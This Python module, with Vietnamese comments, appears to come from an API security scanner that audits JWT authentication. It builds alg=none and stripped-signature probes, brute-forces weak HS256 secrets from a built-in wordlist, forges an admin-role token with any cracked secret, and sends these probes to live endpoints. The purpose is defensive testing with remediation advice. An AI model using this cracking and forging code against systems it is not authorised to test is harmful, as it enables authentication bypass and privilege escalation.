"""core/token_verifier.py — RFC 7519 Token Authentication & Configuration Auditor.

Kiểm tra tính an toàn của JWT Token trên các endpoint bảo vệ theo chuẩn OWASP API2:2023 (Broken Authentication):
- Tấn công `alg: none` (RFC 7519 compliance: server bắt buộc phải từ chối token có alg=none/None).
- Tấn công Stripped Signature (xóa bỏ hoàn toàn phần chữ ký crypto).
- Tấn công Expired Token (sử dụng exp claim trong quá khứ).
- Tấn công Offline Dictionary Cracking: Phục hồi secret key yếu của token HS256 trong < 10ms.
- Tấn công Forged Admin Token: Giả mạo vai trò admin sau khi bẻ khóa secret key.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from dataclasses import dataclass
from typing import Any, Optional

import requests

from core.curl_builder import build_curl_command
from core.tampering import resolve_endpoint_url

COMMON_WEAK_SECRETS = [
    "secret", "jwt_secret", "password", "123456", "12345678", "admin",
    "root", "supersecret", "key", "token", "mysecret", "test",
    "development", "production", "app_secret", "api_key", "secret123",
    "welcome", "changeme", "qwerty", "auth_secret", "jwt_token_secret",
    "private_key", "public_key", "access_token", "default", "node_jwt_secret",
    "flask_secret_key", "django_secret_key", "express_secret", "jwtSecret",
    "topsecret", "1234", "pass", "master", "database", "guest",
]


def b64url_decode(segment: str) -> bytes:
    """Giải mã base64url có bù padding chính xác."""
    rem = len(segment) % 4
    if rem > 0:
        segment += "=" * (4 - rem)
    return base64.urlsafe_b64decode(segment)


def b64url_encode(data: bytes) -> str:
    """Mã hóa base64url bỏ trailing padding '='."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def crack_hs256_secret(raw_token: str, wordlist: list[str] | None = None) -> Optional[str]:
    """Bẻ khóa offline siêu tốc tìm secret key đối xứng của token HS256."""
    token = raw_token.strip()
    if token.lower().startswith("bearer "):
        token = token[7:].strip()
    parts = token.split(".")
    if len(parts) != 3:
        return None

    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    try:
        expected_sig = b64url_decode(parts[2])
    except Exception:
        return None

    candidates = wordlist or COMMON_WEAK_SECRETS
    for secret in candidates:
        sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(sig, expected_sig):
            return secret
    return None


def sign_forged_hs256_token(header: dict[str, Any], payload: dict[str, Any], secret: str) -> str:
    """Tự tạo và ký một JWT HS256 giả mạo hoàn toàn hợp lệ với secret đã bẻ khóa."""
    h_bytes = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p_bytes = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{h_bytes}.{p_bytes}".encode("ascii")
    sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{h_bytes}.{p_bytes}.{sig_b64}"


@dataclass
class TokenInspection:
    raw_token: str
    header: dict[str, Any]
    payload: dict[str, Any]
    algorithm: str = "unknown"
    has_exp: bool = False
    exp_timestamp: Optional[int] = None
    is_expired: bool = False


class TokenVerifier:
    """Kiểm thử tính tuân thủ RFC 7519 và lỗ hổng xác thực JWT."""

    @staticmethod
    def inspect_token(raw_token: str) -> Optional[TokenInspection]:
        token = raw_token.strip()
        if token.lower().startswith("bearer "):
            token = token[7:].strip()

        parts = token.split(".")
        if len(parts) != 3:
            return None

        try:
            header_json = json.loads(b64url_decode(parts[0]).decode("utf-8"))
            payload_json = json.loads(b64url_decode(parts[1]).decode("utf-8"))
        except Exception:
            return None

        alg = header_json.get("alg", "unknown")
        exp = payload_json.get("exp")
        has_exp = isinstance(exp, (int, float))
        exp_ts = int(exp) if has_exp else None
        now_ts = int(time.time())
        is_expired = has_exp and exp_ts < now_ts

        return TokenInspection(
            raw_token=token,
            header=header_json,
            payload=payload_json,
            algorithm=alg,
            has_exp=has_exp,
            exp_timestamp=exp_ts,
            is_expired=is_expired,
        )

    @classmethod
    def audit_token_offline(cls, raw_token: str, target_name: str = "api_target") -> list[dict[str, Any]]:
        """Kiểm thử offline (không gửi request mạng) tính an toàn của token JWT."""
        findings = []
        inspection = cls.inspect_token(raw_token)
        if not inspection:
            return findings

        # Kiểm tra weak secret đối xứng
        if str(inspection.algorithm).upper() in ("HS256", "HS384", "HS512"):
            cracked = crack_hs256_secret(raw_token)
            if cracked:
                findings.append({
                    "tool": "token_verifier",
                    "target_app": target_name,
                    "vulnerability": "JWT Weak HMAC Secret Key",
                    "vuln_type": "JWT Weak HMAC Secret Key",
                    "endpoint": "(Global JWT)",
                    "method": "AUTH",
                    "severity": "critical",
                    "confidence": 100,
                    "confirmed": True,
                    "cwe": "CWE-522",
                    "owasp_category": "API2:2023",
                    "evidence": f"Successfully cracked JWT HMAC secret key offline: '{cracked}'. An attacker can sign arbitrary tokens with full administrator privileges.",
                    "recommendation": "Thay thế HMAC secret bằng chuỗi ngẫu nhiên có độ dài tối thiểu 256-bit (32 ký tự ngẫu nhiên), hoặc chuyển sang dùng cặp khóa bất đối xứng RS256/ES256.",
                })

        return findings

    @classmethod
    def generate_verification_probes(cls, raw_token: str) -> dict[str, str]:
        """Sinh ra các token mồi kiểm thử (probes) chuẩn RFC 7519."""
        inspection = cls.inspect_token(raw_token)
        if not inspection:
            return {}

        probes: dict[str, str] = {}
        header = dict(inspection.header)
        payload = dict(inspection.payload)

        # Probe 1: Alg None (lowercase)
        header_none = {**header, "alg": "none"}
        h_bytes = b64url_encode(json.dumps(header_none, separators=(",", ":")).encode("utf-8"))
        p_bytes = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
        probes["alg_none"] = f"{h_bytes}.{p_bytes}."

        # Probe 2: Stripped Signature (Header giữ nguyên alg nhưng chữ ký bị gỡ hoàn toàn)
        h_orig = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
        probes["stripped_signature"] = f"{h_orig}.{p_bytes}."

        # Probe 3: Expired Token
        if inspection.is_expired:
            probes["expired_claim"] = inspection.raw_token
        else:
            expired_payload = {**payload, "exp": int(time.time()) - 86400}
            exp_bytes = b64url_encode(json.dumps(expired_payload, separators=(",", ":")).encode("utf-8"))
            probes["expired_claim"] = f"{h_orig}.{exp_bytes}.invalid_sig_probe"

        # Probe 4: Forged Admin Token nếu bẻ khóa được secret key
        cracked_secret = crack_hs256_secret(raw_token)
        if cracked_secret:
            admin_payload = dict(payload)
            admin_payload["role"] = "admin"
            admin_payload["is_admin"] = True
            admin_payload["sub"] = "admin"
            probes["cracked_admin_forged"] = sign_forged_hs256_token(header, admin_payload, cracked_secret)

        return probes

    @classmethod
    def audit_endpoint(
        cls,
        base_url: str,
        endpoint: str,
        method: str,
        valid_auth_header: str,
        *,
        auth_header: str = "Authorization",
        auth_prefix: str = "Bearer ",
        custom_headers: dict[str, str] | None = None,
        timeout: float = 6.0,
        insecure: bool = False,
        target_name: str = "api_target",
    ) -> list[dict[str, Any]]:
        """Kiểm thử một endpoint được bảo vệ bằng các token mồi."""
        inspection = cls.inspect_token(valid_auth_header)
        if not inspection:
            return []

        # Giải quyết các path variable như /users/{username} -> /users/1
        full_url = resolve_endpoint_url(base_url, endpoint)
        clean_method = method.upper().strip()

        base_headers = dict(custom_headers or {})

        # 1. Baseline unauthenticated check: Xác nhận route thực sự yêu cầu Auth
        try:
            unauth_resp = requests.request(
                clean_method,
                full_url,
                headers=base_headers,
                timeout=timeout,
                verify=not insecure,
            )
            if unauth_resp.status_code not in (401, 403):
                # Route công khai, không cần xác thực
                return []
        except Exception:
            return []

        findings: list[dict[str, Any]] = []
        probes = cls.generate_verification_probes(valid_auth_header)

        probe_descriptions = {
            "alg_none": ("JWT Algorithm None Bypass", "critical", "CWE-327"),
            "stripped_signature": ("JWT Stripped Signature Accepted", "critical", "CWE-347"),
            "expired_claim": ("JWT Expired Token Accepted", "high", "CWE-613"),
            "cracked_admin_forged": ("JWT Forged Token Accepted (Cracked Key)", "critical", "CWE-522"),
        }

        for probe_name, forged_token in probes.items():
            test_headers = dict(base_headers)
            prefix = auth_prefix if auth_prefix else ""
            test_headers[auth_header] = f"{prefix}{forged_token}".strip()

            try:
                resp = requests.request(
                    clean_method,
                    full_url,
                    headers=test_headers,
                    timeout=timeout,
                    verify=not insecure,
                )
                # Nếu server trả về 200/201/204 -> Server chấp nhận token giả mạo!
                if resp.status_code in (200, 201, 202, 204):
                    vuln_name, sev, cwe = probe_descriptions.get(
                        probe_name, ("Broken Authentication", "high", "CWE-287")
                    )
                    curl_cmd = build_curl_command(
                        clean_method,
                        full_url,
                        headers=test_headers,
                        insecure=insecure,
                    )
                    findings.append({
                        "tool": "token_verifier",
                        "target_app": target_name,
                        "vulnerability": vuln_name,
                        "vuln_type": vuln_name,
                        "endpoint": "/" + endpoint.lstrip("/"),
                        "method": clean_method,
                        "severity": sev,
                        "confidence": 95,
                        "confirmed": True,
                        "cwe": cwe,
                        "owasp_category": "API2:2023",
                        "status_code": resp.status_code,
                        "http_status": resp.status_code,
                        "evidence": f"Server accepted forged probe '{probe_name}' with HTTP {resp.status_code}.",
                        "reproduction_curl": curl_cmd,
                        "reproduction": {
                            "method": clean_method,
                            "url": full_url,
                            "headers": test_headers,
                            "curl": curl_cmd,
                        },
                        "recommendation": (
                            "Cấu hình thư viện JWT bắt buộc xác thực chữ ký bằng thuật toán đối xứng/bất đối xứng cố định, "
                            "từ chối hoàn toàn header alg=none và từ chối token có claim exp trong quá khứ."
                        ),
                    })
            except Exception:
                continue

        return findings
